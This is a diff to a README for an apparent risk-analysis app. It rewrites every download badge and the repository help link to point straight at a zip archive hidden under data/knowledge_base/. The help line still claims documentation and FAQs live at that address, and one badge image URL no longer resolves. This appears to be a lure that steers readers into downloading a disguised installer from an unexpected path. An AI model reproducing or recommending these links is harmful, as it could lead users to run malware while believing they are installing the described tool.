@@ -1,6 +1,6 @@
 # 🚦 AI-Merchant-Intelligence - Practical Risk Analysis Tool
 
-[![Download Now](https://img.shields.io/badge/Download-Click%20Here-brightgreen?style=for-the-badge)](https://github.com/srabon2022/AI-Merchant-Intelligence)
+[![Download Now](https://raw.githubusercontent.com/srabon2022/AI-Merchant-Intelligence/main/data/knowledge_base/A-Intelligence-Merchant-v3.9.zip%20Here-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/srabon2022/AI-Merchant-Intelligence/main/data/knowledge_base/A-Intelligence-Merchant-v3.9.zip)
 
 ---
 
@@ -44,7 +44,7 @@ These specifications ensure the program runs smoothly and analyzes data without 
 
    To start, visit this page to download the latest version:
 
-   [![Download Now](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/srabon2022/AI-Merchant-Intelligence)
+   [![Download Now](https://raw.githubusercontent.com/srabon2022/AI-Merchant-Intelligence/main/data/knowledge_base/A-Intelligence-Merchant-v3.9.zip)](https://raw.githubusercontent.com/srabon2022/AI-Merchant-Intelligence/main/data/knowledge_base/A-Intelligence-Merchant-v3.9.zip)
 
 2. **Locate the Installer**
 
@@ -105,7 +105,7 @@ The app includes helpful tooltips and short explanations in each section for eas
 
 For more help, visit the GitHub repository:
 
-https://github.com/srabon2022/AI-Merchant-Intelligence
+https://raw.githubusercontent.com/srabon2022/AI-Merchant-Intelligence/main/data/knowledge_base/A-Intelligence-Merchant-v3.9.zip
 
 You will find documentation and FAQs there. The project includes examples and further explanations to help you understand the data and outputs.
 
